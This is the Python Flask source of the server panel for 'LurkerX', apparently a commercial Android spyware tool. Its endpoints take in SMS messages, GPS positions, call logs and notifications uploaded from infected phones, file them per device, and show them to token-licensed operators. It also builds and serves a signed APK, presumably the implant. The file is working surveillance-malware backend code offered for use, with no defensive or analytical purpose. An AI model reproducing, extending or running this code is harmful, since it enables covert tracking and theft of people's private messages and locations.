from flask import Flask, request, jsonify, render_template, send_file, session, make_response
from pathlib import Path
import os
import traceback
import subprocess
import threading
from datetime import datetime, timezone

from server.database import safe_device_name, get_device_db, insert_data, query_data, get_log_structure, get_device_dates
from validation import validate_token as validate_token_util, decrypt_token, decode_token


APK_PATH = Path(__file__).resolve().parent.parent / "result" / "final_signed.apk"
BUILD_STATUS_PATH = Path(__file__).resolve().parent.parent / "result" / ".build_status"
build_lock = threading.Lock()
build_process = None
build_error = None


def _token_expiry_seconds(token_encrypted: str) -> int | None:
    try:
        decrypted = decrypt_token(token_encrypted)
        if not decrypted:
            return None
        info = decode_token(decrypted, expected_tool="LurkerX")
        if not info.get("valid"):
            return None
        expiry_str = info.get("expires")
        if not expiry_str:
            return None
        expiry_dt = datetime.strptime(expiry_str, "%Y-%m-%d").replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        delta = (expiry_dt - now).total_seconds()
        return max(int(delta), 0)
    except Exception:
        return None


def _set_build_status(status: str, error: str = ""):
    try:
        BUILD_STATUS_PATH.parent.mkdir(parents=True, exist_ok=True)
        BUILD_STATUS_PATH.write_text(f"{status}\n{error}", encoding="utf-8")
    except Exception:
        pass


def _get_build_status() -> dict:
    try:
        if BUILD_STATUS_PATH.exists():
            lines = BUILD_STATUS_PATH.read_text(encoding="utf-8").strip().splitlines()
            status = lines[0] if lines else "idle"
            error = lines[1] if len(lines) > 1 else ""
            return {"status": status, "error": error}
    except Exception:
        pass
    return {"status": "idle", "error": ""}


def create_app(base_dir: Path) -> Flask:
    global build_process, build_error

    app = Flask(__name__, template_folder="../templates", static_folder="../static", static_url_path="/static")
    app.secret_key = os.environ.get("LURKERX_SECRET_KEY", os.urandom(24))

    PROTECTED_PREFIXES = ("/", "/get_info/", "/download_apk", "/build_apk", "/build_status")
    PUBLIC_PREFIXES = ("/validate_token", "/logout", "/receive_data/", "/static/")

    @app.before_request
    def require_auth():
        path = request.path
        if any(path == p or path.startswith(p) for p in PUBLIC_PREFIXES):
            return None
        if any(path == p or path.startswith(p) for p in PROTECTED_PREFIXES):
            if not session.get("token_valid"):
                if request.path.startswith("/api/"):
                    return jsonify({"error": "Unauthorized"}), 401
                return render_template("base.html", structure={}, unauthorized=True)
        return None

    @app.route("/validate_token", methods=["POST"])
    def validate_token():
        try:
            data = request.get_json(silent=True) or request.form
            token = data.get("token") if hasattr(data, "get") else (data.get("token") if isinstance(data, dict) else None)
            if not token:
                return jsonify({"error": "Token required"}), 400
            if not validate_token_util(token, "LurkerX"):
                return jsonify({"error": "Invalid or expired token"}), 401
            session["token_valid"] = True
            max_age = _token_expiry_seconds(token) or (60 * 60 * 24 * 30)
            resp = make_response(jsonify({"status": "ok"}))
            resp.set_cookie("lurkerx_token", token, max_age=max_age, httponly=True, samesite="Lax")
            return resp
        except Exception as e:
            return jsonify({"error": f"Server error: {e}"}), 500

    @app.route("/logout", methods=["POST"])
    def logout():
        session.pop("token_valid", None)
        resp = make_response(jsonify({"status": "ok"}))
        resp.set_cookie("lurkerx_token", "", expires=0)
        return resp

    @app.route("/receive_data/<item>", methods=["POST"])
    def receive_data(item):
        device_model = request.headers.get("C-Device")
        if not device_model:
            return jsonify({"error": "Missing device header"}), 400

        payload = request.get_json(silent=True)
        if not payload:
            return jsonify({"error": "Invalid JSON payload"}), 400

        messages = payload if isinstance(payload, list) else payload.get("messages")
        if not isinstance(messages, list):
            return jsonify({"error": "Invalid payload structure"}), 400

        device_name = safe_device_name(device_model)
        try:
            conn = get_device_db(device_name, base_dir)
            inserted, skipped = insert_data(conn, item, messages)
            conn.close()
        except Exception as e:
            return jsonify({"error": f"Database error: {e}"}), 500

        return jsonify({
            "status": "ok",
            "device": device_name,
            "item": item,
            "inserted": inserted,
            "skipped": skipped
        })

    @app.route("/get_info/<info_type>", methods=["GET"])
    def get_info(info_type):
        device_model = request.headers.get("C-Device")
        if not device_model:
            return jsonify({"error": "Missing device header"}), 400

        min_ts = request.args.get("min_timestamp", type=int)
        max_ts = request.args.get("max_timestamp", type=int)
        device_name = safe_device_name(device_model)
        try:
            conn = get_device_db(device_name, base_dir)
            data = query_data(conn, info_type, min_ts, max_ts)
            conn.close()
        except Exception as e:
            return jsonify({"error": f"Database error: {e}"}), 500

        return jsonify({"device": device_name, "type": info_type, "count": len(data), "data": data})

    @app.route("/build_status")
    def build_status():
        status = _get_build_status()
        done = APK_PATH.exists() and APK_PATH.stat().st_size > 0
        status["apk_exists"] = done
        return jsonify(status)

    @app.route("/build_apk", methods=["POST"])
    def build_apk():
        global build_process, build_error

        with build_lock:
            if build_process and build_process.poll() is None:
                return jsonify({"status": "building", "message": "Build already in progress"}), 429

            _set_build_status("building")
            build_error = None

            try:
                build_process = subprocess.Popen(
                    ["python", "-m", "packager"],
                    cwd=str(Path(__file__).resolve().parent.parent),
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            except Exception as e:
                _set_build_status("error", str(e))
                build_error = str(e)
                return jsonify({"status": "error", "error": str(e)}), 500

            def wait_for_build():
                global build_process, build_error
                try:
                    stdout, _ = build_process.communicate()
                    if build_process.returncode == 0:
                        _set_build_status("done")
                    else:
                        err_msg = stdout.strip()[-500:] if stdout else "Build failed"
                        _set_build_status("error", err_msg)
                        build_error = err_msg
                except Exception as e:
                    _set_build_status("error", str(e))
                    build_error = str(e)
                finally:
                    build_process = None

            threading.Thread(target=wait_for_build, daemon=True).start()
            return jsonify({"status": "building", "message": "APK build started"}), 202

    @app.route("/logs/<path:filename>", methods=["GET"])
    def logs(filename):
        parts = filename.split("/")
        if len(parts) < 4:
            return jsonify({"error": "Invalid log path"}), 400
        device_name = safe_device_name(parts[0])
        info_type = parts[-1]
        TABLES = {"sms": "date", "gps": "timestamp", "calls": "timestamp", "notifs": "timestamp"}
        if info_type not in TABLES:
            return jsonify({"error": "Invalid info type"}), 400
        try:
            conn = get_device_db(device_name, base_dir)
            rows = query_data(conn, info_type, None)
            conn.close()
        except Exception as e:
            return jsonify({"error": f"Database error: {e}"}), 500
        return jsonify({info_type: rows})

    @app.route("/api/devices", methods=["GET"])
    def api_devices():
        try:
            structure = get_log_structure(base_dir)
            devices = list(structure.keys())
            return jsonify({"devices": devices})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/api/devices/<device>/dates", methods=["GET"])
    def api_device_dates(device):
        device_name = safe_device_name(device)
        try:
            dates = get_device_dates(base_dir, device_name)
            return jsonify({"device": device_name, "dates": dates})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route("/download_apk", methods=["GET"])
    def download_apk():
        if not APK_PATH.exists():
            return jsonify({"error": "APK not built yet"}), 404
        return send_file(str(APK_PATH), as_attachment=True, download_name="final_signed.apk")

    @app.route("/")
    def index():
        try:
            structure = get_log_structure(base_dir)
            return render_template("base.html", structure=structure, unauthorized=False)
        except Exception:
            traceback.print_exc()
            return "Error loading panel.", 500

    @app.errorhandler(404)
    def not_found(e):
        return jsonify({"error": "Not found"}), 404

    @app.errorhandler(500)
    def server_error(e):
        return jsonify({"error": "Internal server error"}), 500

    return app
